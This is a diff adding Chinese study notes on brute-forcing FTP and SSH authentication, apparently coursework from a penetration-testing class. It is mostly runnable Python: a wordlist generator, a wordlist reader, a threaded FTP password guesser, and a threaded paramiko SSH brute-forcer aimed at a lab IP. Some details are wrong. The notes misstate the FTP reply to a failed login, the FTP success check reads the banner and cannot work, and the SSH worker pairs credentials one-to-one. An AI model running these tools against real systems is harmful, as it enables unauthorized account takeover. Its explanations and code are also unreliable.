@@ -1,0 +1,306 @@
+1:简单网络服务认证的攻击
+  针对简单网络服务认证,可以采用暴力破解的方法:把所有可能的密码都尝试一遍
+  把这些密码保存为字典文件
+    攻击通常有三种思路:
+      1:纯字典攻击          利用攻击工具把用户名和字典文件的密码组合起来尝试
+      2:混合攻击            依靠一定的算法对字典文件中的单词进行攻击
+      3:完全暴力攻击        由攻击工具将所有的密码穷举出来
+2:编写破解密码字典
+      常见的字典文件是TXT或者DIC格式
+    在kali中字典文件有三种来源:
+      1:使用字典生成工具来制造自己需要的字典
+      2:使用kali自带的字典
+      3:从互联网上下载字典
+    其中生成字典至少要指定:
+      1:字典中包含词汇的长度
+      2:字典中包含词汇所使用的字符(默认为小写字符)
+  2.1:可以使用python来实现字典生成
+        python模块:itertools
+        函数:
+        count()                  产生递增的序列(如count(1,5):1,6,11...)
+        cycle()                  重复序列中的元素(如cycle('hello'):h,e,l,l,o)
+        repeat()                 重复元素(repeat(100):100,100,100....)
+        product()                用来获得多个循环器的笛卡尔积
+        permutations('abc',2)    从abc中挑选两个元素,将结果排序,并返回新的循环器(组合是有序的)
+        combinations('abc',2)    从abc中挑选两个元素,将结果排序,并返回新的循环器(组合是无序的)
+  2.2:python实现
+      import itertools
+
+      def produce_dict(path,words='1234567890',length=6):
+          passwd= itertools.permutations(words,length)
+          with open(path,'a') as passwords:
+              for i in passwd:
+                  passwords.write(''.join(i))
+                  passwords.write('\n')
+      if __name__ == '__main__':
+          # 指定生成字典的字符
+          words = input('请输入密码所含字符范围:')
+          # 指定生成密码的长度
+          length = int(input('请输入想要生成密码的长度:'))
+          # 保存的路径
+          path = input('请输入想要保存的路径:')
+          # 开始生成
+          produce_dict(path,words,length)
+
+  2.3:编写函数来读取破解密码字典文件
+      import queue
+      def GetPassword(path):
+          words = queue.Queue()
+          try:
+              with open(path, 'r') as f:
+                  for line in f:  # 逐行读取整个文件
+                      word = line.strip('\n')  # 去除行尾换行符
+                      if word:  # 忽略空行
+                          words.put(word)
+          except IOError as e:  # 更具体的异常捕获
+              print(f'Error: {str(e)}')
+          return words
+
+3:FTP暴力破解模块
+    3.1:简介
+      FTP（File Transfer Protocol，文件传输协议）用于Internet上控制文件的双向传输。
+      同时，它也是一个应用程序。使用FTP时必须首先登录，在远程主机上获得相应的权限以后，方可下载或上传文件。
+      也就是说，要想同哪一台计算机传送文件，就必须具有那一台计算机的授权。换言之，除非有用户ID和口令，否则无法传送文件。
+    	不过现在大部分FTP都提供了匿名登录的机制，这种FTP可以使用用户名anonymous和任意的密码来登录。
+      这里考虑的主要是如何对设置了用户名和密码限制的FTP进行破解。
+  3.2:先介绍一下FTP的工作流程:
+  	（1）客户机去连接目标FTP服务器的21号端口，建立命令通道。
+          服务器会向客户端发送“220 FreeFloat Ftp Server（Version 1.00）”回应，括号内的信息会因为服务器不同而不同。
+    （2）客户机向服务器发送“USER用户名\r\n”，服务器会返回“331 Please specify the password .\r\n”。
+    （3）客户机向服务器发送“PASS密码\r\n”，如果密码认证成功，服务器会返回“230 User Logged in.\r\n”；
+          如果密码认证错误，服务器会返回“200 Switching to Binary mode.\r\n”。
+
+  3.3:python对FTP的支持
+      python中默认提供一个专门用来对FTP进行操作的ftplib模块:
+        ftp.connect('IP','port')                   连接到FTP服务器和端口
+        ftp.login('user','password')               连接的用户名和密码
+        ftp.retrlines(command,callback)            使用文本传输模式返回在服务器上执行命令的结果
+    3.3.1:在kali中登录FTP:
+        python:
+        import ftplib
+        def login(target,user,passwd):
+            ftp = ftplib.FTP(target)
+            ftp.connect(target,port=21,timeout=5)
+            ftp.login(user,passwd)
+            ftp.retrlines('LIST')
+            ftp.quit()
+        if __name__ == '__main__':
+            target = '192.168.209.1'
+            user = 'admin'
+            passwd = 'test'
+            login(target,user,passwd)
+          前提是需要启动一台FTP服务器,可以使用软件来模仿(比如:simpleftp)
+
+        下面可以试着将2.3节和3.2.1节结合起来:
+        python:
+          import ftplib
+          import queue
+          import threading
+          def get_passwd(path):
+              words = queue.Queue()
+              try:
+                  with open(path) as f:
+                      for line in f:
+                          line = line.strip('\n')
+                          words.put(line)
+              except Exception as e:
+                  print(f'Error: {str(e)}')
+              return words
+          def login(target,words,user='admin'):
+              try:
+                  ftp = ftplib.FTP(target)
+                  ftp.connect(target,port=21,timeout=3)
+                  passwd = words.get()
+                  ftp.login(user,passwd)
+                  if ftp.getwelcome().startswith('230'):
+                      return
+              except Exception as e:
+                  print(f'Error:{str(e)}')
+          
+          def run(target,words):
+              for _ in range(1,10):
+                  t = threading.Thread(target=login,args=(target,words))
+                  t.start()
+          if __name__ == '__main__':
+              target = '192.168.209.1'
+              path = r'D:\Documents\Desktop\网安\阶段1-python安全脚本开发\渗透测试\破解密码字典\password-kali.txt'
+              words = get_passwd(path)
+              run(target,words)
+
+4:SSH暴力破解模块
+  4.1:简介
+      SSH是Secure Shell的缩写，由IETF的网络小组（Network Working Group）制定。SSH是建立在应用层上的安全协议。
+      SSH是目前较可靠，专为远程登录会话和其他网络服务提供安全保障的协议。
+      利用SSH可以有效防止远程管理过程中的信息泄露问题。这个协议和Telnet一样，都可以用来实现远程管理，
+      但是由于Telnet在传输的过程没有使用任何加密方式，所以被认为是不安全的，而SSH则成为目前远程管理的首选协议。
+	    SSH相比于FTP更为复杂一点,首先建立SSH服务器:  
+        使用winsshd软件来模仿SSH服务器
+        点击StartWinSSHD即可启动SSH服务
+      SSH客户端使用PuTTy:在hostname中输入IP地址即可
+  4.2:使用python的paramiko来实现
+      python:
+      import paramiko
+      import threading
+      import queue
+      import os
+      import sys
+      import time
+      from paramiko.ssh_exception import AuthenticationException, SSHException
+      
+      # 全局控制变量
+      stop_event = threading.Event()
+      found_credentials = {'status': False}
+      lock = threading.Lock()
+      
+      
+      def load_wordlist(path):
+          """增强型字典加载函数"""
+          q = queue.Queue()
+          try:
+              clean_path = os.path.normpath(path)
+              if not os.path.exists(clean_path):
+                  raise FileNotFoundError(f"文件不存在: {clean_path}")
+      
+              with open(clean_path, 'r', errors='ignore') as f:
+                  for line in f:
+                      line = line.strip()
+                      if line:  # 过滤空行
+                          q.put(line)
+              if q.empty():
+                  raise ValueError("字典文件为空")
+          except Exception as e:
+              print(f"[!] 加载错误: {str(e)}")
+              sys.exit(1)
+          return q
+      
+      
+      def ssh_connect(host, port, timeout):
+          """专用SSH连接验证函数"""
+          try:
+              client = paramiko.SSHClient()
+              client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+              client.connect(host, port=port, timeout=timeout)
+              client.close()
+              return True
+          except (SSHException, Exception) as e:
+              return False
+      
+      
+      def authentication_worker(host, users, passwords, port=22, timeout=5):
+          """改进的认证工作线程"""
+          while not stop_event.is_set() and not (users.empty() and passwords.empty()):
+              try:
+                  # 获取凭证组合
+                  user = users.get_nowait() if not users.empty() else None
+                  password = passwords.get_nowait() if not passwords.empty() else None
+      
+                  if user and password:
+                      try:
+                          client = paramiko.SSHClient()
+                          client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                          client.connect(host, port=port,
+                                         username=user, password=password,
+                                         timeout=timeout, banner_timeout=30)
+      
+                          with lock:
+                              if not found_credentials['status']:
+                                  found_credentials.update({
+                                      'status': True,
+                                      'user': user,
+                                      'password': password
+                                  })
+                                  stop_event.set()
+                                  print(f"\n[+] 破解成功! 用户名: {user} 密码: {password}")
+                          client.close()
+                          return
+      
+                      except AuthenticationException:
+                          print(f"[-] 认证失败: {user}:{password}")
+                      except SSHException as e:
+                          print(f"[!] SSH协议错误: {str(e)}")
+                          # 将凭证放回队列
+                          users.put(user)
+                          passwords.put(password)
+                      except Exception as e:
+                          print(f"[!] 连接异常: {str(e)}")
+                          # 网络问题则重试
+                          users.put(user)
+                          passwords.put(password)
+                      finally:
+                          try:
+                              client.close()
+                          except:
+                              pass
+              except queue.Empty:
+                  break
+      
+      
+      def run_bruteforce(host, users, passwords, max_threads=20):
+          """增强的线程控制器"""
+          # 先验证SSH服务可用性
+          if not ssh_connect(host, 22, 5):
+              print("[!] SSH服务不可用或无法连接")
+              return
+      
+          print(f"[*] 目标主机: {host}")
+          print(f"[*] 加载用户名数: {users.qsize()}")
+          print(f"[*] 加载密码数: {passwords.qsize()}")
+      
+          # 动态计算线程数
+          thread_pool = min(max_threads, users.qsize() * passwords.qsize() // 100 or 10)
+          print(f"[*] 启动线程数: {thread_pool}")
+      
+          # 创建线程
+          threads = []
+          for _ in range(thread_pool):
+              t = threading.Thread(target=authentication_worker,
+                                   args=(host, users, passwords))
+              t.daemon = True
+              threads.append(t)
+              t.start()
+      
+          # 进度监控
+          try:
+              total = users.qsize() * passwords.qsize()
+              while not stop_event.is_set():
+                  remaining = users.qsize() * passwords.qsize()
+                  sys.stdout.write(f"\r进度: {100 - (remaining / total * 100):.1f}% 剩余尝试: {remaining}")
+                  sys.stdout.flush()
+                  time.sleep(0.5)
+      
+                  if all(not t.is_alive() for t in threads):
+                      break
+          except KeyboardInterrupt:
+              print("\n[!] 用户中断操作")
+              stop_event.set()
+      
+          # 等待线程结束
+          for t in threads:
+              t.join()
+      
+          if not found_credentials['status']:
+              print("\n[-] 未找到有效凭证")
+      
+      
+      if __name__ == '__main__':
+          host = '192.168.209.1'
+      
+          # 使用原始字符串处理Windows路径
+          user_file = r'D:\Documents\Desktop\网安\阶段1-python安全脚本开发\渗透测试\破解密码字典\username-kali.txt'
+          pass_file = r'D:\Documents\Desktop\网安\阶段1-python安全脚本开发\渗透测试\破解密码字典\password-kali.txt'
+      
+          # 加载字典
+          try:
+              user_queue = load_wordlist(user_file)
+              pass_queue = load_wordlist(pass_file)
+          except Exception as e:
+              sys.exit(1)
+      
+          # 启动破解
+          run_bruteforce(host, user_queue, pass_queue, max_threads=30)
+
+5:Web暴力破解
+  
+
+
+
